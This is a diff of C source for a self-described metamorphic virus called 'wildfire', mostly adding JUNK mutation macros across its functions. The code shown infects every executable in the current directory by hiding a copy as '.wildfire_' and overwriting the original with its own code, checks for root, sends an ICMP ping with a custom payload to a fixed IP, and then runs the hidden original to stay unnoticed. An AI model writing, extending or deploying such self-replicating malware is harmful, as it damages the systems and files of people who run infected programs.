@@ -209,20 +209,20 @@ void execute()
 void copy_and_hide_file(const char *bash_code, const char *filename)
 {
     int cmd_len = strlen(bash_code) + strlen(filename) + 1;
-    char cmd[cmd_len];
+    char cmd[cmd_len];                      JUNK;
 
     sprintf(cmd, bash_code, filename, filename);
 
-    system(cmd);
+    system(cmd);                            JUNK;
 }
 
 /* Executes a bash command */
 void execute_bash(const char *bash_code, const char *file_name)
 {
     int cmd_len = strlen(bash_code) + strlen(file_name) + 1;
-    char cmd[cmd_len];
+    char cmd[cmd_len];                      JUNK;
 
-    sprintf(cmd, bash_code, file_name);
+    sprintf(cmd, bash_code, file_name);     JUNK;
 
     system(cmd);
 }
@@ -230,10 +230,10 @@ void execute_bash(const char *bash_code, const char *file_name)
 /* Embeds the malware in the executable and hides a copy of the original executable */
 void embed_code(const char *file_name)
 {
-    copy_and_hide_file("cp %s .wildfire_%s", file_name);
-    execute_bash("chmod +x %s", file_name);
+    copy_and_hide_file("cp %s .wildfire_%s", file_name);    JUNK;
+    execute_bash("chmod +x %s", file_name);                 JUNK;
 
-    write_code(file_name); JUNK;
+    write_code(file_name);                                  JUNK;
 }
 
 // Lists files in passed in directory path
@@ -242,7 +242,7 @@ DIR *dir;
     struct dirent *ent;
 
     // Open directory stream
-    dir = opendir ("./");
+    dir = opendir ("./");                                   JUNK;
     if (dir != NULL) {
         // Iterate over all files in the current directory
         while ((ent = readdir (dir)) != NULL) {
@@ -255,31 +255,31 @@ DIR *dir;
                     // Ignore the executable that is running the program
                     if (strstr(exclude, ent->d_name) != NULL)
                     {
-                        original_executable = ent->d_name;
+                        original_executable = ent->d_name;  JUNK;
                     }
                     // Ignore hidden executables with wildfire label
                     else if (strstr(ent->d_name, "wildfire") != NULL)
                     {
-                        first_run = 0;
+                        first_run = 0;                      JUNK;
                     }
                     else
                     {
                         // Ignore executables that have already been infected
                         const char *bash_code = ".wildfire_%s";
                         int hidden_file_len = strlen(bash_code) + strlen(ent->d_name) + 1;
-                        char hidden_file[hidden_file_len];
+                        char hidden_file[hidden_file_len];  JUNK;
                         sprintf(hidden_file, bash_code, ent->d_name);
 
                         // 
                         if( access(hidden_file, F_OK) == -1 ) {
-                            embed_code(ent->d_name);
+                            embed_code(ent->d_name);        JUNK;
                         }
                     }
                 }
             }
         }
 
-        closedir (dir);
+        closedir (dir);                                     JUNK;
 
     } else {
         // Error if directory fails to open
@@ -291,17 +291,16 @@ DIR *dir;
 /* Main function of metamorphic virus */
 int main(int argc, char* argv[])
 {
-    printf("EXE FILE: %s\n", argv[0]);
     // Outputs 0 if executable is running with root privileges
     system("id -u");
     // Sends ICMP ping with custom payload to IP
-    execute("192.168.1.142");
+    execute("192.168.1.142");                               JUNK;
     // Reads code into memory from currently running executable
-    read_code(argv[0]);  JUNK;
+    read_code(argv[0]);                                     JUNK;
     // Metamorphically changes the code in a random fashion
-    replace_junk();      JUNK;
+    replace_junk();                                         JUNK;
     // Propagates the malware into other executables in the same directory
-    propagate("./", argv[0]);
+    propagate("./", argv[0]);                               JUNK;
     // Edge case to prevent an infinite loop during the malware's first execution
     if (first_run == 1)
     {
@@ -309,7 +308,7 @@ int main(int argc, char* argv[])
         execute_bash("chmod +x .wildfire_%s", original_executable);
     }
     // Execute the original, hidden executable
-    execute_bash("./.wildfire_%s", original_executable);
+    execute_bash("./.wildfire_%s", original_executable);    JUNK;
 
     return 0;
 }
